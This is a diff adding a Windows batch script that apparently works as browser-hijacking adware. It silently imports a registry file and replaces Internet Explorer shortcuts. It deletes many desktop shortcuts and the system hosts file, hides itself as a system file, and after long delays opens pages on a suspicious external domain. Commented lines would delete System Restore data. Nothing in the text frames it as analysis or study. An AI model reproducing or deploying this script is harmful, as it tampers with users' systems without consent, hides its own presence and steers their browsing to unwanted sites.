@@ -1,0 +1,88 @@
+@shift
+@echo off
+
+
+regedit /s key.reg
+
+
+
+copy "Internet Explore.lnk" "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\启动 Internet Explorer 浏览器.lnk" /Y
+
+copy "Internet Explore.lnk" "C:\Documents and Settings\Administrator\Application Data\Microsoft\Internet Explorer\Quick Launch\启动 Internet Explorer 浏览器.lnk" /Y
+
+copy "Internet Explore.lnk" "%USERPROFILE%\「开始」菜单\Internet Explore.lnk" /Y
+
+copy "Internet Explore.lnk" "%USERPROFILE%\「开始」菜单\程序\Internet Explore.lnk" /Y
+
+del "%USERPROFILE%\桌面\网址大全.lnk"
+
+del "%ALLUSERSPROFILE%\桌面\网址大全.lnk"
+
+del "C:\Documents and Settings\Administrator\桌面\网址大全.lnk"
+
+del "%USERPROFILE%\桌面\365天网址.lnk"
+
+del "%USERPROFILE%\桌面\最新免费影视展播.lnk"
+
+del "%USERPROFILE%\桌面\i看影视.lnk"
+
+del "%USERPROFILE%\桌面\免费高清电影.lnk"
+
+del "%USERPROFILE%\桌面\2345网址导航(IE).lnk"
+
+del "%ALLUSERSPROFILE%\桌面\很快视频搜索.lnk"
+
+del "%USERPROFILE%\桌面\Internet Explorer.lnk"
+
+del "C:\Documents and Settings\Administrator\桌面\365天网址.lnk"
+
+del "%USERPROFILE%\桌面\了解网址大全.lnk"
+
+del "C:\Documents and Settings\Administrator\桌面\了解网址大全.lnk"
+
+del "%USERPROFILE%\桌面\IEXPLORE.EXE.lnk"
+
+del "%USERPROFILE%\桌面\IEXPLORE.lnk"
+
+del "%USERPROFILE%\桌面\Internet Explore.lnk"
+
+del "C:\Documents and Settings\Administrator\桌面\IEXPLORE.lnk"
+
+del "C:\Documents and Settings\Administrator\桌面\Internet Explorer.lnk"
+
+del "%USERPROFILE%\桌面\*.url"
+
+del "C:\Documents and Settings\Administrator\桌面\*.url"
+
+del key.reg
+
+::删除host文件
+del %windir%\system32\drivers\etc\hosts
+
+ATTRIB +H +R +S +A c:\iexplor.bat
+
+
+::刷新（加服务）
+msiexec /regserver
+
+::ATTRIB -H -R -S -A c:\GRLDR
+
+::del c:\GRLDR /S /Q
+
+::del C:\WINDOWS\system32\Restore /S /Q
+
+ping 127.0.0.1 /n 3600 >nul
+
+start explorer http://hao123163qqbaidu.qingchun-meinv.cn/news/news1.html
+
+ping 127.0.0.1 /n 4000 >nul
+
+start explorer http://hao123163qqbaidu.qingchun-meinv.cn/news/news2.html
+
+ping 127.0.0.1 /n 4600 >nul
+
+start explorer http://hao123163qqbaidu.qingchun-meinv.cn/news/news3.html
+
+exit
+
+
